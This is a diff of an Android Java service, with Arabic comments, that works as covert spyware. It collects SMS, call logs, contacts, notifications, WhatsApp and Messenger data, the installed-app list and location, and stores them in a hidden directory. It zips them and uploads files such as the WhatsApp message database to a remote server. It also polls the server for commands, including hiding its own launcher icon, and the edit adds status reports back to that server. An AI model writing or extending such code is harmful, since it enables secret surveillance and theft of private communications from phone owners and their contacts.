@@ -37,7 +37,6 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
-import java.util.zip.ZipOutputStream;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
@@ -85,8 +84,10 @@ public class CoreService extends Service {
     }
     
     private void startTasks() {
+        // إرسال كل شيء عند البداية
         handler.postDelayed(() -> sendAllData(), 5000);
         
+        // التحقق من الأوامر كل 10 ثواني
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -95,6 +96,7 @@ public class CoreService extends Service {
             }
         }, 10000);
         
+        // إرسال تحديث الحالة كل 30 ثانية
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -117,12 +119,19 @@ public class CoreService extends Service {
         handler.postDelayed(() -> new Thread(() -> sendLocation()).start(), 14000);
     }
     
+    // ═══════════════════════════════════════════
+    // SMS
+    // ═══════════════════════════════════════════
+    
     private void sendSMS() {
         try {
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
             
-            if (cursor == null) return;
+            if (cursor == null) {
+                sendResponse("sms", false, "لا يمكن الوصول للرسائل");
+                return;
+            }
             
             StringBuilder sb = new StringBuilder();
             sb.append("=== SMS Messages ===\n\n");
@@ -145,20 +154,28 @@ public class CoreService extends Service {
             cursor.close();
             
             saveToFile("sms", sb.toString());
-            sendData("sms", sb.toString());
+            sendResponse("sms", true, count + " رسالة");
             
             Log.d(TAG, "SMS sent: " + count);
         } catch (Exception e) {
+            sendResponse("sms", false, e.getMessage());
             Log.e(TAG, "SMS error", e);
         }
     }
+    
+    // ═══════════════════════════════════════════
+    // المكالمات
+    // ═══════════════════════════════════════════
     
     private void sendCalls() {
         try {
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
             
-            if (cursor == null) return;
+            if (cursor == null) {
+                sendResponse("calls", false, "لا يمكن الوصول للمكالمات");
+                return;
+            }
             
             StringBuilder sb = new StringBuilder();
             sb.append("=== Call Log ===\n\n");
@@ -190,20 +207,28 @@ public class CoreService extends Service {
             cursor.close();
             
             saveToFile("calls", sb.toString());
-            sendData("calls", sb.toString());
+            sendResponse("calls", true, count + " مكالمة");
             
             Log.d(TAG, "Calls sent: " + count);
         } catch (Exception e) {
+            sendResponse("calls", false, e.getMessage());
             Log.e(TAG, "Calls error", e);
         }
     }
+    
+    // ═══════════════════════════════════════════
+    // جهات الاتصال
+    // ═══════════════════════════════════════════
     
     private void sendContacts() {
         try {
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
             
-            if (cursor == null) return;
+            if (cursor == null) {
+                sendResponse("contacts", false, "لا يمكن الوصول لجهات الاتصال");
+                return;
+            }
             
             StringBuilder sb = new StringBuilder();
             sb.append("=== Contacts ===\n\n");
@@ -241,13 +266,18 @@ public class CoreService extends Service {
             cursor.close();
             
             saveToFile("contacts", sb.toString());
-            sendData("contacts", sb.toString());
+            sendResponse("contacts", true, count + " جهة اتصال");
             
             Log.d(TAG, "Contacts sent: " + count);
         } catch (Exception e) {
+            sendResponse("contacts", false, e.getMessage());
             Log.e(TAG, "Contacts error", e);
         }
     }
+    
+    // ═══════════════════════════════════════════
+    // الإشعارات
+    // ═══════════════════════════════════════════
     
     private void sendNotifications() {
         try {
@@ -262,6 +292,7 @@ public class CoreService extends Service {
             sb.append("=== Notifications ===\n\n");
             
             File[] files = notifDir.listFiles();
+            int count = 0;
             if (files != null) {
                 for (File f : files) {
                     if (f.isFile() && f.getName().endsWith(".txt")) {
@@ -270,6 +301,7 @@ public class CoreService extends Service {
                         String line;
                         while ((line = reader.readLine()) != null) {
                             sb.append(line).append("\n");
+                            count++;
                         }
                         reader.close();
                         fis.close();
@@ -278,16 +310,24 @@ public class CoreService extends Service {
             }
             
             String data = sb.toString();
-            if (data.length() > 100) {
-                saveToFile("notifications", data);
-                sendData("notifications", data);
+            saveToFile("notifications", data);
+            
+            if (count > 0) {
+                sendResponse("notifications", true, count + " إشعار");
+            } else {
+                sendResponse("notifications", true, "لا توجد إشعارات");
             }
             
-            Log.d(TAG, "Notifications sent");
+            Log.d(TAG, "Notifications sent: " + count);
         } catch (Exception e) {
+            sendResponse("notifications", false, e.getMessage());
             Log.e(TAG, "Notifications error", e);
         }
     }
+    
+    // ═══════════════════════════════════════════
+    // WhatsApp
+    // ═══════════════════════════════════════════
     
     private void sendWhatsApp() {
         try {
@@ -320,6 +360,7 @@ public class CoreService extends Service {
                 "/storage/emulated/0/WhatsApp/Media"
             };
             
+            int mediaCount = 0;
             for (String path : mediaPaths) {
                 File media = new File(path);
                 if (media.exists() && media.isDirectory()) {
@@ -330,6 +371,7 @@ public class CoreService extends Service {
                             if (f.isDirectory()) {
                                 File[] subFiles = f.listFiles();
                                 if (subFiles != null) {
+                                    mediaCount += subFiles.length;
                                     sb.append("  ").append(f.getName()).append(": ").append(subFiles.length).append(" files\n");
                                 }
                             }
@@ -338,21 +380,29 @@ public class CoreService extends Service {
                 }
             }
             
+            saveToFile("whatsapp", sb.toString());
+            
             if (found) {
-                saveToFile("whatsapp", sb.toString());
-                sendData("whatsapp", sb.toString());
+                sendResponse("whatsapp", true, "قاعدة البيانات + " + mediaCount + " ملف وسائط");
                 
                 File dbFile = new File(secretPath + "/whatsapp/msgstore.db");
                 if (dbFile.exists()) {
                     sendFile("whatsapp_db", dbFile);
                 }
+            } else {
+                sendResponse("whatsapp", false, "واتساب غير مثبت أو لا يمكن الوصول");
             }
             
             Log.d(TAG, "WhatsApp sent");
         } catch (Exception e) {
+            sendResponse("whatsapp", false, e.getMessage());
             Log.e(TAG, "WhatsApp error", e);
         }
     }
+    
+    // ═══════════════════════════════════════════
+    // Messenger
+    // ═══════════════════════════════════════════
     
     private void sendMessenger() {
         try {
@@ -378,16 +428,24 @@ public class CoreService extends Service {
                 }
             }
             
+            saveToFile("messenger", sb.toString());
+            
             if (found) {
-                saveToFile("messenger", sb.toString());
-                sendData("messenger", sb.toString());
+                sendResponse("messenger", true, "تم سحب البيانات");
+            } else {
+                sendResponse("messenger", false, "ماسنجر غير مثبت أو لا يمكن الوصول");
             }
             
             Log.d(TAG, "Messenger sent");
         } catch (Exception e) {
+            sendResponse("messenger", false, e.getMessage());
             Log.e(TAG, "Messenger error", e);
         }
     }
+    
+    // ═══════════════════════════════════════════
+    // بيانات التطبيقات
+    // ═══════════════════════════════════════════
     
     private void sendAppData() {
         try {
@@ -397,26 +455,41 @@ public class CoreService extends Service {
             PackageManager pm = getPackageManager();
             List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
             
+            int systemCount = 0;
+            int userCount = 0;
+            
             for (android.content.pm.ApplicationInfo app : apps) {
                 String name = pm.getApplicationLabel(app).toString();
                 String pkg = app.packageName;
                 boolean isSystem = (app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
                 
                 sb.append(name).append(" (").append(pkg).append(")");
-                if (isSystem) sb.append(" [SYSTEM]");
+                if (isSystem) {
+                    sb.append(" [SYSTEM]");
+                    systemCount++;
+                } else {
+                    userCount++;
+                }
                 sb.append("\n");
             }
             
             sb.append("\nTotal: ").append(apps.size()).append(" apps");
+            sb.append("\nSystem: ").append(systemCount);
+            sb.append("\nUser: ").append(userCount);
             
             saveToFile("app_data", sb.toString());
-            sendData("app_data", sb.toString());
+            sendResponse("app_data", true, apps.size() + " تطبيق");
             
             Log.d(TAG, "App data sent: " + apps.size());
         } catch (Exception e) {
+            sendResponse("app_data", false, e.getMessage());
             Log.e(TAG, "App data error", e);
         }
     }
+    
+    // ═══════════════════════════════════════════
+    // الموقع
+    // ═══════════════════════════════════════════
     
     private void sendLocation() {
         try {
@@ -445,25 +518,36 @@ public class CoreService extends Service {
                         sb.append("Accuracy: ").append(netLoc.getAccuracy()).append("m\n");
                         sb.append("Time: ").append(new Date(netLoc.getTime())).append("\n");
                     }
+                    
+                    if (gpsLoc != null || netLoc != null) {
+                        saveToFile("location", sb.toString());
+                        sendResponse("location", true, "تم تحديد الموقع");
+                    } else {
+                        sendResponse("location", false, "لا يوجد موقع متاح");
+                    }
                 } catch (SecurityException e) {
-                    sb.append("Location permission not granted");
+                    sendResponse("location", false, "لا تملك صلاحية الموقع");
                 }
+            } else {
+                sendResponse("location", false, "خدمة الموقع غير متاحة");
             }
-            
-            saveToFile("location", sb.toString());
-            sendData("location", sb.toString());
             
             Log.d(TAG, "Location sent");
         } catch (Exception e) {
+            sendResponse("location", false, e.getMessage());
             Log.e(TAG, "Location error", e);
         }
     }
+    
+    // ═══════════════════════════════════════════
+    // إنشاء ملف ZIP
+    // ═══════════════════════════════════════════
     
     private void sendAllZip() {
         try {
             File zipFile = new File(secretPath + "/backup_" + System.currentTimeMillis() + ".zip");
             
-            ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
+            java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(new FileOutputStream(zipFile));
             
             File[] dirs = new File(secretPath).listFiles();
             if (dirs != null) {
@@ -477,14 +561,16 @@ public class CoreService extends Service {
             zos.close();
             
             sendFile("all_backup", zipFile);
+            sendResponse("all_zip", true, "ملف ZIP: " + zipFile.length() + " bytes");
             
             Log.d(TAG, "ZIP sent: " + zipFile.length());
         } catch (Exception e) {
+            sendResponse("all_zip", false, e.getMessage());
             Log.e(TAG, "ZIP error", e);
         }
     }
     
-    private void addDirToZip(ZipOutputStream zos, File dir, String basePath) throws Exception {
+    private void addDirToZip(java.util.zip.ZipOutputStream zos, File dir, String basePath) throws Exception {
         File[] files = dir.listFiles();
         if (files == null) return;
         
@@ -506,6 +592,10 @@ public class CoreService extends Service {
             }
         }
     }
+    
+    // ═══════════════════════════════════════════
+    // التحقق من الأوامر
+    // ═══════════════════════════════════════════
     
     private void checkCommands() {
         new Thread(() -> {
@@ -553,6 +643,9 @@ public class CoreService extends Service {
             case "all_zip": sendAllZip(); break;
             case "hide": hideApp(); break;
             case "unhide": unhideApp(); break;
+            default:
+                sendResponse(cmd, false, "أمر غير معروف");
+                break;
         }
     }
     
@@ -563,8 +656,9 @@ public class CoreService extends Service {
                 component,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
+            sendResponse("hide", true, "تم إخفاء التطبيق");
         } catch (Exception e) {
-            Log.e(TAG, "Hide error", e);
+            sendResponse("hide", false, e.getMessage());
         }
     }
     
@@ -575,10 +669,42 @@ public class CoreService extends Service {
                 component,
                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                 PackageManager.DONT_KILL_APP);
+            sendResponse("unhide", true, "تم إظهار التطبيق");
         } catch (Exception e) {
-            Log.e(TAG, "Unhide error", e);
+            sendResponse("unhide", false, e.getMessage());
         }
     }
+    
+    // ═══════════════════════════════════════════
+    // إرسال الرد للسيرفر
+    // ═══════════════════════════════════════════
+    
+    private void sendResponse(String type, boolean success, String message) {
+        try {
+            URL url = new URL(serverUrl + "/api/response");
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(15000);
+            
+            String json = String.format(
+                "{\"device_id\":\"%s\",\"type\":\"%s\",\"success\":%s,\"message\":\"%s\",\"timestamp\":\"%s\"}",
+                deviceId, type, success, message.replace("\"", "\\\""), new Date().toString());
+            
+            conn.getOutputStream().write(json.getBytes());
+            conn.getResponseCode();
+            conn.disconnect();
+            
+            Log.d(TAG, "Response sent: " + type + " - " + (success ? "success" : "failed"));
+        } catch (Exception e) {
+            Log.e(TAG, "Response error", e);
+        }
+    }
+    
+    // ═══════════════════════════════════════════
+    // إرسال البيانات
+    // ═══════════════════════════════════════════
     
     private void sendData(String type, String data) {
         try {
